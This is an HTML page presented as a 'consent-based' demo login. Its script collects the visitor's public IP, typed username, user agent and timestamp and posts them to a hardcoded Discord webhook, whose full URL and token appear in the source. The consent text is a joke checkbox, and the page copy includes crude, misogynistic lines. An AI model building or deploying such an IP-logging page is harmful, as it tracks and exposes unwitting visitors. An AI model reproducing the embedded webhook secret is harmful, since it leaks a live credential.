<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Demo Login (Consent-based IP log)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root { --bg:#0f1115; --card:#151922; --text:#e7e9ee; --muted:#9aa3b2; --accent:#6ea8fe; --ok:#2ecc71; --err:#ff6b6b; }
    * { box-sizing: border-box; }
    body { margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial; background:linear-gradient(135deg,#0c0f14,#12151c); color:var(--text); display:grid; place-items:center; min-height:100vh; }
    .card { width:100%; max-width:420px; background:var(--card); border:1px solid #232a36; border-radius:16px; padding:24px; box-shadow:0 10px 30px rgba(0,0,0,.35); }
    h1 { margin:0 0 8px; font-size:1.35rem; }
    p { margin:0 0 14px; color:var(--muted); }
    label { display:block; font-size:.9rem; margin:12px 0 4px; color:#cfd6e4; }
    input[type="text"], input[type="password"]{ width:100%; padding:12px 14px; border-radius:10px; border:1px solid #293040; background:#0e1219; color:var(--text); outline:none; }
    .consent { display:flex; gap:10px; align-items:flex-start; margin-top:12px; color:var(--muted); font-size:.9rem; }
    button { margin-top:16px; width:100%; padding:12px 16px; border:0; border-radius:10px; background:var(--accent); color:#08101d; font-weight:700; cursor:pointer; }
    .status { margin-top:12px; font-size:.9rem; }
    .ok { color:var(--ok); }
    .err { color:var(--err); }
    .note { font-size:.8rem; color:var(--muted); margin-top:10px; line-height:1.4; }
    .footer { margin-top:14px; font-size:.75rem; color:#8190a7; }
    a { color:#9ec1ff; text-decoration:none; }
  </style>
</head>
<body>
  <main class="card">
    <h1>Demo Login</h1>
    <p>Fuck u <strong>only if you consent</strong>.Any random user pass idc.</p>

    <form id="loginForm">
      <label for="u">Username (demo)</label>
      <input id="u" name="u" type="text" placeholder="e.g., demo_user" required />

      <label for="p">Password (demo)</label>
      <input id="p" name="p" type="password" placeholder="not stored; demo only" required />

      <label class="consent">
        <input id="consent" type="checkbox" />
        <span>Js click the box for fun <strong>:P</strong>, gYATT.</span>
      </label>

      <button type="submit">Log in (Demo)</button>
      <div id="status" class="status"></div>
      <div class="note">Get me a beer woman <code>https://api.ipify.org?format=json</code>. This is for learning/webhook testing only.</div>
      <div class="footer">Owner tip: Use a serverless relay if you don’t want your webhook URL exposed in page source.</div>
    </form>
  </main>

  <script>
    // ⚠️ Replace this with a freshly rotated webhook after testing.
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1415036208525869178/eV9hU5siJ12gce2RoQXsRFkrUpqOLe6i4fyG9cKIMoS-wCXIoSFPg8uA3E7WXYtHaYWK";

    const statusEl = document.getElementById('status');
    function setStatus(msg, ok=false, err=false){
      statusEl.textContent = msg;
      statusEl.className = 'status ' + (ok ? 'ok' : '') + (err ? 'err' : '');
    }

    async function getPublicIP() {
      const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
      if (!res.ok) throw new Error('Failed to fetch IP');
      const data = await res.json();
      return data.ip;
    }

    async function sendToDiscord({ ip, username }) {
      const ua = navigator.userAgent;
      const ts = new Date().toISOString();

      const content = [
        "**Consent-based demo login**",
        `• IP: \`${ip}\``,
        `• Username: \`${username}\` (demo)`,
        `• User-Agent: \`${ua}\``,
        `• Time: \`${ts}\``
      ].join("\n");

      const payload = { content };
      const res = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (!res.ok) {
        const t = await res.text().catch(()=> '');
        throw new Error(`Discord webhook error: ${res.status} ${t}`);
      }
    }

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      setStatus('');

      const username = (document.getElementById('u').value || '').trim();
      const consent = document.getElementById('consent').checked;

      if (!consent) {
        setStatus('Please check the consent box to proceed.', false, true);
        return;
      }

      try {
        setStatus('Fetching IP…');
        const ip = await getPublicIP();

        setStatus('Sending to Discord…');
        await sendToDiscord({ ip, username });

        setStatus('Success! (IP sent to Discord)', true, false);
      } catch (err) {
        console.error(err);
        setStatus('Failed: ' + err.message, false, true);
      }
    });
  </script>
</body>
</html>

